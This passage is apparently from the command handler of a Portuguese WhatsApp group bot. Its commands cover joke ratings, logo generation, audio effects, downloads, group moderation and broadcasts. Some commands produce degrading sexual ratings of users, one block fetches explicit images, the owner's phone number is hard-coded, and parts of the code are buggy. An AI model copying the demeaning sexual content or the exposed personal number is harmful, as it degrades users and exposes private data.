m.reply(`  O quanto você é gostoso? 😏\n\n「 `+rate+` 」Você é: ❰ `+random+`% ❱ gostoso 😝`)
}, 8000)
}
break 
case `rr`:

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    rate = body.slice(1)
                    ratee = ["Tac... Não disparou","Tac... Não disparou, ainda...","Tac💥 Disparou e você morreu","Tac💥Disparou mas a bala pegou de raspão","A arma falhou","Tac... Por pouco que não dispara...","Tac... A arma estava descarregada"]
                    const cu = ratee[Math.floor(Math.random() * ratee.length)]
                    m.reply(``+ cu+``)
break
case `sn`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
const sn = [`sim`, `não`]
gosto = body.slice(3)
if (args.length < 1) return m.reply(`Você deve fazer uma pergunta...\nExemplo: ${prefix}sn o alone é um preguiçoso?`)
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nSegundo meus cálculos, eu acredito que... ${jawab}`
m.reply(hasil)
}
break
case `gadometro`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `Você é:\n\n${gado}`
m.reply(hisil) 
}
break
case `pau`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
random = `${Math.floor(Math.random() * 35)}`
const tamanho = random
if (tamanho < 13 ) {pp = `só a fimose`} else if (tamanho == 13 ) {pp = `passou da média😳`} else if (tamanho == 14 ) {pp = `passou da média😳`} else if (tamanho == 15 ) {pp = `eita, vai pegar manga?`} else if (tamanho == 16 ) {pp = `eita, vai pegar manga?`} else if (tamanho == 17 ) {pp = `calma man, a mina não é um poço😳`} else if (tamanho == 18 ) {pp = `calma man, a mina não é um poço😳`} else if (tamanho == 19 ) {pp = `calma man, a mina não é um poço😳`} else if (tamanho == 20 ) {pp = `você tem um poste no meio das pernas`} else if (tamanho == 21 ) {pp = `você tem um poste no meio das pernas`} else if (tamanho == 22 ) {pp = `você tem um poste no meio das pernas`} else if (tamanho == 23 ) {pp = `você tem um poste no meio das pernas`} else if (tamanho == 24 ) {pp = `você tem um poste no meio das pernas`} else if (tamanho > 25 ) {pp = `vai procurar petróleo com isso?`
}
hasil = `Seu pau tem ${random}cm\n\n${pp}`
m.reply(hasil)
}
break
case `beijo`: {              
     
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (!m.isGroup) return m.reply(mess.group)
                    if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return
                    mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                    pro = `.\n`
                    for (let _ of mentioned) {
                        pro += `@${_.split(`@`)[0]}\n`
                    }
                    yhbj = `@${m.sender.split("@")[0]} deu um beijão no(a) @${mentioned[0].split(`@`)[0]}`
                    anya.sendText(from, yhbj, m)
                    }
                    break
            case `abraço`: {          
         
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (!m.isGroup) return m.reply(mess.group)
                    if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return
                    mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                    pro = `.\n`
                    for (let _ of mentioned) {
                        pro += `@${_.split(`@`)[0]}\n`
                    }
                    yhb = `Que fofo... @${m.sender.split("@")[0]} deu um abraço apertado em @${mentioned[0].split(`@`)[0]}`
                    anya.sendText(from, yhb, m)
                    }
                    break
            case `amongus`: {
                    
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (!m.isGroup) return m.reply(mess.group)
                    if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return m.reply(`Você precisa mencionar alguém`)
                    mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                    pro = `.\n`
                    for (let _ of mentioned) {
                        pro += `@${_.split(`@`)[0]}\n`
                    }
                    sus =
                        `.      　。　　　　•　    　ﾟ　　。
　　.　　　.　　　  　　.　　　　　。　　   。　.
　.　　      。　        ඞ   。　    .    •
•            @${mentioned[0].split(`@`)[0]} was E j e c t e d
                  1 impostor remain   。　.
　 　　。　　 　　　　ﾟ　　　.　      　　　.
,　　　　.                  .`
                        //  tiringa.groupRemove(from, mentioned)
                    anya.sendText(from, `${sus}`, m)
                    }
                    break
case 'perfil':

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
try {
ppimg = await anya.getProfilePicture(`${m.sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const asLvl = getLevelingLevel(m.sender)
const ssXp = getLevelingXp(m.sender)
const dptr = `     「 🔥 ~_*PERFIL*_~ 🌈 」
🗒 *Nome* : *${pushname}*
🪀 *Número* : @${m.sender.split("@")[0]}
🐂 *Nível gado* : *${nivelgador}${nivelgado2r}%*
😈 *Nível puta* : *${putar}${putar2}%*
😋 *Nível de gostosura* : *${gostosurar}${gostosurar2}%*
🍼 *Valor do programa* : *R$${programa}*

➻ *~_CONSELHO_~* :
${conselho}`
daftarimg = await getBuffer(ppimg)
anya.sendMessage(m.chat, { image: ppnyauser, caption: dptr }, { quoted: m })
break
case 'logos':{
if (args.length < 1) return m.reply('digite seu nick.\n\nexemplo: !logos alone')
listMessage = {
                    text: `logos com o nome: ${q}`,
                    footer: `${watermark}`,
                    buttonText: 'Opções',
                    title: "menu de logos",
                    sections: [{
                        title: 'selecione abaixo',
                        rows: [{
                            rowId: `!matrix ${q}`,
                            title: 'matrix',
                            description: ''
                        },
                        {
                            rowId: `!dropwater ${q}`,
                            title: 'dropwater',
                            description: ''
                        },{
                            rowId: `!firework ${q}`,
                            title: 'firework',
                            description: ''
                        },{
                            rowId: `!natural ${q}`,
                            title: 'natural',
                            description: ''
                         },{
                            rowId: `!neondevil ${q}`,
                            title: 'neondevil',
                            description: ''
                            },{
                            rowId: `!christmas ${q}`,
                            title: 'christmas',
                            description: ''
                            },{
                            rowId: `!3dgradient ${q}`,
                            title: '3dgradient',
                            description: ''
                            },{
                            rowId: `!blackpink ${q}`,
                            title: 'blackpink',
                            description: ''
                            },{
                            rowId: `!gluetext ${q}`,
                            title: 'gluetext',
                            description: ''
                            },{
                            rowId: `!berry ${q}`,
                            title: 'berry',
                            description: ''
                            },{
                            rowId: `!thunder ${q}`,
                            title: 'thunder',
                            description: ''
                            },{
                            rowId: `!magma ${q}`,
                            title: 'magma',
                            description: ''
                            },{
                            rowId: `!harrypotter ${q}`,
                            title: 'harrypotter',
                            description: ''
                            },{
                            rowId: `!foggywindows ${q}`,
                            title: 'foggywindows',
                            description: ''
                            },{
                            rowId: `!space ${q}`,
                            title: 'space',
                            description: ''
                            },{
                            rowId: `!metallic ${q}`,
                            title: 'metallic',
                            description: ''
                            },{
                            rowId: `!fiction ${q}`,
                            title: 'fiction',
                            description: ''
                            },{
                            rowId: `!greenhorror ${q}`,
                            title: 'greenhorror',
                            description: ''
                            },{
                            rowId: `!transformer ${q}`,
                            title: 'transformer',
                            description: ''
                            },{
                            rowId: `!sketch ${q}`,
                            title: 'sketch',
                            description: ''
                            },{
                            rowId: `!halloween ${q}`,
                            title: 'halloween',
                            description: ''
                            
                        }]
                    }]
                }
                anya.sendMessage(from, listMessage)
}
break
case 'matrix':  case 'dropwater': case 'firework': case 'natural': case 'gluetext': case 'blackpink': case '3dgradient': case 'christmas': case 'neondevil': case 'foggywindows': case 'harrypotter': case 'magma': case 'thunder': case 'berry': case 'transformer': case 'greenhorror': case 'fiction': case 'metallic': case 'space': case 'sketch': case 'halloween': {
m.reply(mess.wait)
                if (!text) return m.reply(`Example : ${prefix + command} text`)
                anukk = await getBuffer(`https://zenzapis.xyz/textpro/${command}?text=${text}&apikey=hdiiofficial`)
                anya.sendMessage(m.chat, { image: anukk, caption: `Text Pro ${command}` }, { quoted: m}).catch((err) => m.reply('*obtive erros, tente novamente, caso não der certo a api deve ter caido.*'))
	            }
                break
case 'listafake':
                if(!m.isGroup) return m.reply(mess.group)
                if(!isAdmins) return m.reply(mess.admin)
                teks = '*_LISTA DE MEMBROS FAKES DO GRUPO_* \n'
                men = []
                for(let mem of groupMembers) {
                    if(!mem.id.startsWith(55)) {
                        teks += `➤ @${mem.id.split('@')[0]}\n`
                        men.push(mem.id)
                    }
                }
                if(teks.indexOf('➤') < 0) return m.reply('*_nenhum membro fake neste grupo_*')
                anya.sendMessage(from, {text: teks, mentions: men})
            break
case 'correio': {
num = q.split('|')[0]
jumlah = q.split('|')[1]
if (args.length < 1) return m.reply(`digite o número da pessoa sem espaços ou símbolos, ex: ${prefix + command} 558898204406|ola`)
var numero = `${m.sender.split('@')[0]}`
let buttons = [
{ buttonId: `!correiorespondrapid ${numero}`, buttonText: { displayText: 'RESPONDER' }, type: 1 }
]
 await anya.sendButtonText(`${num}@s.whatsapp.net`, buttons, `Olá, você recebeu uma mensagem.\n\n*Mensagem:* ${jumlah}\n\n*Remetente:* ` + lerNumber(numero) + ` - ${pushname}`, `${watermark}`)
anya.sendMessage(m.chat, {text: 'mensagem enviada com sucesso!'}, {quoted:m})
}
break
case 'correiorespondrapid':
responderCorr(args[0])
break
case 'enquete': {
num = q.split('|')[0]
jumlah = q.split('|')[1]
yag = q.split('|')[2]
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `${num}`,
"options": [
	{
"optionName": `${jumlah}`
	},
	{
"optionName": `${yag}`
	}
],
"selectableOptionsCount": 2
	}
}), { userJid: m.chat, quoted: m })
anya.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
   try {
   let set
   if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
   if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
   if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
   if (/earrape/.test(command)) set = '-af volume=12'
   if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
   if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
   if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
   if (/reverse/.test(command)) set = '-filter_complex "areverse"'
   if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
   if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
   if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
   if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
   if (/audio/.test(mime)) {
   m.reply(mess.wait)
   let media = await anya.downloadAndSaveMediaMessage(quoted)
   let ran = getRandom('.mp3')
   exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
   fs.unlinkSync(media)
   if (err) return m.reply(err)
   let buff = fs.readFileSync(ran)
   anya.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
   fs.unlinkSync(ran)
   })
   } else m.reply(`Marque um audio com: *${prefix + command}*`)
   } catch (e) {
   m.reply(e)
   }
   break
case 'delete': case 'del': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !groupOwner && !isCreator) return m.reply(mess.admin)
                let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 anya.sendMessage(m.chat, { delete: key })
            }
            break
case 'stickersearch': {
   //   if (isBan) throw mess.ban
  if (!text) return m.reply(`*Use ${prefix + command} enter query sticker*`) 
  let noh = require('./lib/lol.js')                
  noh.stickersearch(`${text}`).then(async (res) => {   
  for (let x of res.sticker_url) {
  anya.sendImageAsSticker(m.chat, x, m, { packname: `${pushname}`, author: `${nomedobot}` })      
               }
                }).catch((err) => {
                    m.reply(`*${text} Not found*`)
                })
            }
            break
case 'infogrupo':
       case 'gpinfo':
       case 'grupoinfo':
              if (!m.isGroup) return m.reply(mess.group)
              try {
                    ppgroup = await anya.profilePictureUrl(m.chat, 'image')
                } catch {
                    ppgroup = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
              let ingfo = `*G R U P O I N F O*\n\n*Nome :* ${groupName}\n*ID :* ${from}\n*Criado em :* ${moment(`${groupMetadata.creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\n*Criador do gp :* @${groupMetadata.owner.split('@')[0]}\n*Quantidade de admins :* ${groupAdmins.length}\n*Número de participantes :* ${groupMembers.length}\n*Descrição :* \n${groupMetadata.desc}`
//              akame.sendMessage(from, await getBuffer(pic), image, {quoted: mek, thumbnail: null, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              anya.sendMessage(from, { image: { url: ppgroup}, caption: ingfo }, { quoted: m })
             break			
             case 'tempban':
			if (!m.isGroup) return m.reply(mess.group)
			if (!isAdmins) return m.reply(mess.admin)
			if (!isBotAdmins) return m.reply(mess.Badmin)
						if (!m.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
				if (args[1]=="segundos") {var tempokk = args[0]+"000"
				} else if (args[1]=="minuto") {var tempokk = args[0]+"0000"
				} else if (args[1]=="hora") {var tempokk = args[0]+"00000"
				} else {return m.reply("*selecionar:*\nsegundos\nminuto\nhora")}
				kick = m.message.extendedTextMessage.contextInfo.participant
		 anya.groupParticipantsUpdate(m.chat, [kick], 'remove')
			m.reply(`Membro banido com sucesso\nirei adicionalo daqui: ${args[0]} ${args[1]}`)
				setTimeout( () => {
				anya.groupParticipantsUpdate(m.chat, [kick], 'add')
				m.reply(`Olá @${kick.split('@')[0]} bem vindo de volta, pfv se comporte dessa vez...`)
				}, tempokk)
   break		
case 'fbdl': case 'fb': case 'facebook': case 'pesbuk': {     	    
         
if (!text) return m.reply('*Insira um link do facebook!*')
if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return m.reply('*O link que você forneceu não é válido*')

let bocil = require('@bochilteam/scraper')  
bocil.facebookdlv2(`${text}`).then(async (data) => {                   

let txt = `*FB DOWNLOAD*\n\n`

txt += `*⬤TÍTULO :* ${data.title}\n`

txt += `*⬤QUALIDADE :* ${data.result[0].quality}\n`

txt += `*⬤DESCRIÇÃO :* ${data.description}\n`

txt += `*⬤URL :* ${text}\n\n`

txt += `*${nomedobot}*`                

buf = await getBuffer(data.thumbnail)    

anya.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         

for (let i of data.result) {     

anya.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*⬤ Qualidade :* ${i.quality}`}, { quoted: m })

}          

}).catch((err) => {

m.reply(`*Falha ao baixar mídia e enviar arquivos*`)

})

 }

 break
case 'fbmp3': {     	    
         
if (!text) return m.reply('*Insira um link do facebook!*')
if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return m.reply('*O link que você forneceu não é válido*')
              
let bocil = require('@bochilteam/scraper')  
bocil.facebookdlv2(`${text}`).then(async (data) => {                   

let txt = `*FB DOWNLOAD*\n\n`

txt += `*⬤TÍTULO :* ${data.title}\n`

txt += `*⬤QUALIDADE :* ${data.result[0].quality}\n`

txt += `*⬤DESCRIÇÃO :* ${data.description}\n`

txt += `*⬤URL :* ${text}\n\n`

txt += `*${nomedobot}*`                

buf = await getBuffer(data.thumbnail)    

anya.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         

for (let i of data.result) {     

anya.sendMessage(m.chat, { audio: { url: i.url }, mimetype: 'audio/mp4' }, { quoted: m })  

}          

}).catch((err) => {

m.reply(`*Falha ao baixar mídia e enviar arquivos*`)

})

 }

 break
case 'film':
	m.reply(mess.wait)
if (!q) return reply(`Qual filme você quer pesquisar?\nExemplo: ${prefix}film Homem-Aranha`)
xeonkey.Film(q)
    .then(data => {console.log(data)
    let krl = `*❒「  Filme ${q} 」*\n\n`
			    for (let i of data) {
                krl += (`\n────────────────────\n\n *📍Título :* ${i.judul}\n *📟 Qualidade :* ${i.quality}\n *🖥️ Modelo : ${i.type}*\n *⌛ Carregado :* ${i.upload}\n *🌍 Fonte :* ${i.link}`)
                }
             //  anya.sendMessage(from, { image: { url: i[0].thumb}, caption: krl }, { quoted: fdocs })
             m.reply(krl)
});
break
case `autosticker`: {
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !groupOwner && !isCreator) return m.reply(mess.admin)
if (args[0]  === `on`){
if (isAutoSticker) return m.reply(`Já esta ativo.`)
autosticker.push(from)
fs.writeFileSync(`./database/autosticker.json`, JSON.stringify(autosticker))
m.reply(`autosticker ativado`)
} else if (args[0] === `off`){
let anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync(`./database/autosticker.json`, JSON.stringify(autosticker))
} else {
             let buttons = [
                        { buttonId: `${prefix}autosticker on`, buttonText: { displayText: `✅ ATIVAR` }, type: 1 },
                        { buttonId: `${prefix}autosticker off`, buttonText: { displayText: `❌ DESATIVAR` }, type: 1 }
                    ]
                    await anya.sendButtonText(m.chat, buttons, `escolha uma das opções.`, `${watermark}`, m)

            }
            }
break
case 'silk':  
case '3dnature': 
case 'bevel': 
case 'birthdaycake': 
case  'burnpaper':  
case 'coffee': 
case 'coffee-heartcup': 
case 'embroiderytext': 
case 'flaming': 
case 'flowertypo': 
case 'funnycup': 
case 'fur': 
case 'gerbang': 
case 'glowrainbow': 
case 'gradientavatar': 
case 'graffititext': 
case 'harrypotter': 
case 'lovemessage': 
case 'luxuryroyal': 
case 'neonlight': 
case 'sweetcandy': 
case 'summertext': 
case 'woodheart': 
case 'woodblock': 
case 'yellowroses': 
case 'wolfmetal': 
case 'underwaterocean': {
if (!text) return m.reply(`Example : ${prefix + command} text`)
anu = await getBuffer(`https://violetics.pw/api/photooxy/${command}?apikey=beta&text=${text}`)
anya.sendMessage(m.chat, { image: anu, caption: `*PHOTO OXY ${command}*` , quoted: m, contextInfo: { externalAdReply:{
  title:"anya-md",
  body:"anya-md",
  showAdAttribution: true,
  mediaType:2,
  thumbnail: fs.readFileSync(`./lib/anya.jpg`) ,
  mediaUrl:`https://wa.me/+558898204406`, 
sourceUrl: `https://wa.me/+558898204406` }}}, {quoted: m})
}
break
case 'nsfw': {	 			
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
 if (!isAdmins && !isCreator) return m.reply(mess.admin)
 if (args[0] === "on") {
 if (isAntinsfw) return m.reply('*Ja estava ativo*')
 sacoleno.push(from)
 m.reply('*Vixi😏*')
 var group = await anya.groupMetadata(from)
 var members = group['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 anya.sendMessage(from, {text: `*Modo nsfw ativo agora o bot podera enviar imagens quentes😉*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!isAntinsfw) return m.reply('*Ja estava desativado*')
 let off = sacoleno.indexOf(from)
 sacoleno.splice(off, 1)
 m.reply('*Ativado*')
 } else {
let button = [
{ buttonId: `!nsfw on`, buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: `!nsfw off`, buttonText: { displayText: 'OFF' }, type: 1 }
]
await anya.sendButtonText(m.chat, button, `*Modo nsfw*`, m)
}
}
break
case 'autoreact':
if (!m.isGroup) return m.reply(resposta.group)
if (!isBotAdmins) return m.reply(resposta.botAdmin)
if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(resposta.admin)
if (args[0] === 'on') {
if (isAutReact) return m.reply('*[❗] ja esta ativado amigo...*')
autoreact.push(from)
fs.writeFileSync('./database/autoreact.json', JSON.stringify(autoreact))
m.reply('auto reação ativo com sucesso')
} else if (args[0] === 'off') {
let position = autoreact.indexOf(autoreact.find((x) => x === from))
if (position === -1) return m.reply(`${command} não estava ativo antes`)
autoreact.splice(position, 1)
fs.writeFileSync('./database/autoreact.json', JSON.stringify(autoreact))
m.reply('auto reação desativado com sucesso')
} else {
  let buttonsreact = [
  { buttonId: `${prefix}${command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 },
  { buttonId: `${prefix}${command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsreact, 'Clique no botão abaixo\n\nOn para ativar\nOff para desativar', `${watermark}`, m)
  }
break
case 'git': case 'gitclone':
	m.reply(mess.wait)
            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            if (!args[0]) throw `Use ${prefix}gitclone repo link\nExample: https://github.com/DGXeon/CheemsBot-MD4`
    if (!regex1.test(args[0])) throw mess.linkm
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    anya.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(mess.error))
    break
case 'toqr':{
  if (!q) return m.reply(' Inclua link ou texto!')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await anya.sendMessage(from, { image: medi, caption:"Aqui está!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'swm': case 'rename': case 'roubar': case 'take': {  
            let text1 = q.split("|")[0]
            let text2 = q.split("|")[1]
              if (!isQuotedSticker) return m.reply(`Responder a um adesivo com legenda ext|text\n\nExemplo: ${prefix + command} alone|anya`)   
              if (!text1) return m.reply(`Exemplo! : !roubar alone|anya`)    
              if (!text2) return m.reply(`Exemplo! : !roubar alone|anya`)
               // anya.sendMessage(from, { react: { text: "â±ï¸", key: m.key }})
             let buff = await anya.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
             console.log(buff)
             let proc = await writeExifStc(buff, { packname: text1, author: text2 })
             await anya.sendMessage(from, { sticker: { url: proc } }, { quoted: m })
             await fs.unlinkSync(proc)
          }
          break
case 'masturbation': 
case 'jahy': 
case 'hentai': 
case 'glasses': 
case 'gangbang': 
case 'foot': 
case 'femdom': 
case 'cum': 
case 'ero': 
case 'cuckold': 
case 'blowjob': 
case 'bdsm': 
case 'ahegao': 
case 'ass': 
case 'orgy': 
case 'panties': 
case 'pussy': 
case 'thighs': 
case 'yuri': 
case 'tentacles': 
if (!m.isGroup) return m.reply(mess.group)
if (!isAntinsfw) return m.reply('*para usar este comando o modo nsfw precisa estar ativo, prfvr usar !nsfw on*')
try{
m.reply(mess.wait)
hwindi = await fetchJson(`https://myselfff.herokuapp.com/docs/nsfw/${command}`)
stallone = await getBuffer(hwindi.result)
anya.sendMessage(m.sender, {image:stallone},{quoted:m})
} catch (e) {error("Error")}
break
case 'join': {
   if (!isCreator) return m.reply('Criador?!')
   if (!text) return m.reply('link?!')
   if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('*Invalido*')
   m.reply(mess.wait)
   let result = args[0].split('https://chat.whatsapp.com/')[1]
   await anya.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 }
 break
 case 'leave': {
    if (!isCreator) return m.reply('Criador?!')
   await anya.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 }
 break
case 'block': {
 if (!isCreator) return m.reply('Criador?!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anya.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'unblock': {
 if (!isCreator) return m.reply('Criador?!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anya.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'addcriador':
case 'addowner':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Exemplo ${prefix+command} 55×××××`)
bnnd = `${args[0].replace('@', '')}`
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`O número ${bnnd} tornou-se proprietário!!!`)
break
case 'delowner':
case 'delowner':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Exemplo ${prefix+command} 55×××××`)
ya = `${args[0].replace('@', '')}`
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`O número ${ya} foi excluído da lista de proprietários!!!`)
break
case 'listacriador':    
let lbw = `Esta é a lista de donos\nTotal : ${owner.length}\n`
for (let i of owner) {
lbw += `➸ ${i.replace(owner)}\n`
}
m.reply(lbw)
//await limitAdd(sender)
break 
case 'admins':
case 'listadmins':  
case 'listaadmins':   
if (!isAdmins) return m.reply(mess.admin)
if (!m.isGroup) return m.reply(mess.group)
ytb = `Lista de admins do grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
ytb += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
//mentions(ytb, groupAdmins, true)
anya.sendMessage(m.chat, { text: ytb, mentions: groupAdmins }, { quoted: m})
break
case 'owner': case 'creator': case 'criador': case 'dono': {
            	    
		    	 	
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                let vcard = 'BEGIN:VCARD\n' // metadata do ctt
                    + `VERSION:3.0\n` 
                    + `N:;${nomedodono}.;;;`
                    + `FN:${nomedodono}.\n` // nome todo
                    + `ORG:${nomedodono};\n` // organização
                    + 'TEL;type=CELL;type=VOICE;waid=558898204406:+55 88 9820-4406\n' // WhatsApp ID + número
                    + 'END:VCARD' // finalização
                   // anya.sendMessage(from, {text: 'contato do meu criador enviado para o seu privado'}, {quoted:m})
                anya.sendMessage(m.sender, { contacts: { displayName: `${nomedodono}.`, contacts: [{ vcard }] } }, { quoted: m })
                anya.sendMessage(m.sender, { text: 'aqui está o vcard do contato do meu criador, caso não esteja conseguindo abrir, aqui está o wa.me dele: wa.me/+558898204406'})
            }
            
            
           
            break
case 'bc': case 'broadcast': case 'bcall': {
  if (!isCreator) return m.reply('Criador?!')
   if (!text) return m.reply(`txt?`)
   let anu = await store.chats.all().map(v => v.id)
   m.reply(`*Aviso do criador*\n ${anu.length}`)
for (let yoi of anu) {
    await sleep(1500)
    let btn = [{
 quickReplyButton: {
  displayText: 'OWNER',
  id: '!owner'
 }
  }]
 fatihgans = fs.readFileSync('./lib/anya.jpg')
 let txt = `「 anya-md 」\n\n${text}`
 anya.send5ButImg(yoi, txt, `Broadcast By alone no shawty's`, fatihgans, btn)
